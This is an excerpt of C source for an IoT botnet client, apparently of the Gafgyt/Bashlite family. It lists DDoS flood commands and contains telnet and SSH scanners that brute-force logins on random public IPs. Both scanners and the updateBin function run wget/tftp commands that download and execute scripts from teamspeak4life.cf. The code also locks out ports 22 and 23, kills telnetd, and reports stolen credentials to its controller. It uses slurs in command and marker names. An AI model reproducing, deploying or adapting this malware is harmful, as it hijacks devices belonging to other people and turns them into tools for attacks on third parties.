...
!* HOLD <ip> <port> <time>
!* JUNK <ip> <port> <time>
!* UDP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <packet size (1 to 65500)> (time poll interval, default 10)
...
!* STOP
!* LOLNOGTFO (KILLS ALL BOTS)
!* UNKNOWN IP PORT TIME (WORKING ON IT)
!* RAPE IP PORT TIME (WORKING ON IT)
!* SKYPE USERNAME TIME (WORKING ON IT)
*/
...
/*  ________     __  ______________   _____
   /  _/ __ \   / / / /_  __/  _/ /  / ___/
   / // /_/ /  / / / / / /  / // /   \__ \ 
 _/ // ____/  / /_/ / / / _/ // /______/ / 
/___/_/       \____/ /_/ /___/_____/____/  
*/
...
/*
   __  ______  ____  ___  ________________ 
  / / / / __ \/ __ \/   |/_  __/ ____/ __ \
 / / / / /_/ / / / / /| | / / / __/ / /_/ /
...
void updateBin()
{
        ...
        if ( (pid = fork()) == 0) {
		system("cd /tmp || cd /mnt || cd /var/run;rm -f *;wget http://teamspeak4life.cf/gtop.sh || busybox wget http://teamspeak4life.cf/gtop.sh; sh gtop.sh; rm -f *.sh;tftp teamspeak4life.cf -c get tftp.sh;sh tftp.sh;rm -rf tftp.sh");
                sleep(20);
        } else {
                printf("%d\n", pid);
        }
...
/*______________    _   ______________   _____ _________    _   ___   ____________ 
 /_  __/ ____/ /   / | / / ____/_  __/  / ___// ____/   |  / | / / | / / ____/ __ \
  / / / __/ / /   /  |/ / __/   / /     \__ \/ /   / /| | /  |/ /  |/ / __/ / /_/ /
 / / / /___/ /___/ /|  / /___  / /     ___/ / /___/ ___ |/ /|  / /|  / /___/ _, _/ 
/_/ /_____/_____/_/ |_/_____/ /_/     /____/\____/_/  |_/_/ |_/_/ |_/_____/_/ |_|   
*/                                                                       

void StartTheTel(int nothing)
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp || cd /mnt || cd /var/run;busybox tftp teamspeak4life.cf -c get tftp.sh;sh tftp.sh;busybox tftp -r tftp1.sh -g teamspeak4life.cf; sh tftp1.sh;wget http://teamspeak4life.cf/gtop.sh || busybox wget http://teamspeak4life.cf/gtop.sh; sh gtop.sh;iptables -A INPUT -p tcp --dport 23 -j DROP;iptables -A INPUT -p tcp --dport 22 -j DROP;/sbin/iptables -A INPUT -p tcp --dport 23 -j DROP;/sbin/iptables -A INPUT -p tcp --dport 23 -j DROP;kill -9 $(pidof telnetd)\r\n", 463, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
			...
			case 10:
				{
					...
					if(readUntil(fds[i].fd, "gayfgt", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						if(strstr(fds[i].sockbuf, "ulti-call") != NULL) sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
						memset(fds[i].sockbuf, 0, 1024);
						sclose(fds[i].fd);
						fds[i].complete = 1;
						//fds[i].lastWorked = 1;
...
/*
   __________ __  __   _____ _________    _   ___   ____________ 
  / ___/ ___// / / /  / ___// ____/   |  / | / / | / / ____/ __ \
  \__ \\__ \/ /_/ /   \__ \/ /   / /| | /  |/ /  |/ / __/ / /_/ /
 ___/ /__/ / __  /   ___/ / /___/ ___ |/ /|  / /|  / /___/ _, _/ 
/____/____/_/ /_/   /____/\____/_/  |_/_/ |_/_/ |_/_____/_/ |_|  
*/
void StartTheSSH(int nothing)
{
	int max = (getdtablesize() / 4) * 3, i, res;
	fd_set myset;
	struct timeval tv;
	...
	const char *commandline = "cd /tmp || cd /mnt || cd /var/run;wget http://teamspeak4life.cf/gtop.sh; sh gtop.sh; rm -f gtop.sh;echo -e '\\147\\141\\171\\146\\147\\164'\r\n";
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 0:
				{
					...
					if(fds[i].complete) { libssh2_session_disconnect(session, "Bye!"); libssh2_session_free(session); char *tmp = fds[i].sockbuf; memset(&(fds[i]), 0, sizeof(struct sshstate_t)); fds[i].sockbuf = tmp; fds[i].ip = getRandomPublicIP(); }
					else {
						fds[i].passwordInd++;
						if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) { fds[i].passwordInd = 0; fds[i].usernameInd++; }
						if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) { fds[i].complete = 1; continue; }
			...
			case 2:
				{
				if (libssh2_userauth_password(session, username, strlen(passwords[fds[i].passwordInd]))) {
			...
			case 7:
				{
					libssh2_channel_exec(channel, commandline);
					if( rc != 0 ) {
			...
			case 8:
				{
					if(fprintf(stderr, "gayfgt", fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						if(strstr(fds[i].sockbuf, "multi-call") != NULL) 
						sockprintf(mainCommSock, "REPORT %s:root:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), passwords[fds[i].passwordInd]);
						memset(fds[i].sockbuf, 0, 1024);
						sclose(fds[i].fd);
						fds[i].complete = 1;
						//fds[i].lastWorked = 1;
...
/*  ________  ______   __  ______    _____   __
   /  _/ __ \/ ____/  /  |/  /   |  /  _/ | / /
   / // /_/ / /      / /|_/ / /| |  / //  |/ / 
 _/ // _, _/ /___   / /  / / ___ |_/ // /|  /  
...
void processCmd(int argc, unsigned char *argv[])
{
	int x;
        ...
        if(!strcmp(argv[0], "GETLOCALIP"))
        {
		 ...
		 if(!strcmp(argv[0], "UPDATEBIN"))
        {
                sockprintf(mainCommSock, "I'm updating");
				updateBin(1);
                return;
        }
        if(!strcmp(argv[0], "TELSCANNER"))
        {
                if(argc != 2)
                {
                        sockprintf(mainCommSock, "TELSCANNER ON | OFF");
                        return;
                }
                ...
                if(!strcmp(argv[1], "ON"))
                {
                        ...
                        uint32_t parent;
                        parent = fork();
						printf("Attempting to start Telnet Scan\n");
				...
				if(!strcmp(argv[0], "SSHSCANNER"))
				{
                if(argc != 2)
                {
                        sockprintf(mainCommSock, "SSHSCANNER ON | OFF");
                        return;
                }
                ...
                {
                        if(scanPid == 0) return;
                        sockprintf(mainCommSock, "SSHSCANNER OFF");
                        kill(scanPid, 9);
                        scanPid = 0;
                }
                ...
                if(!strcmp(argv[1], "ON"))
                {
                        ...
                        uint32_t parent;
                        parent = fork();
                        printf("Attempting to start the SSH Scan\n");
                        sockprintf(mainCommSock, "SSHSCANNER ON");
                        if (parent > 0) { scanPid = parent; return;}
                        else if(parent == -1) return;
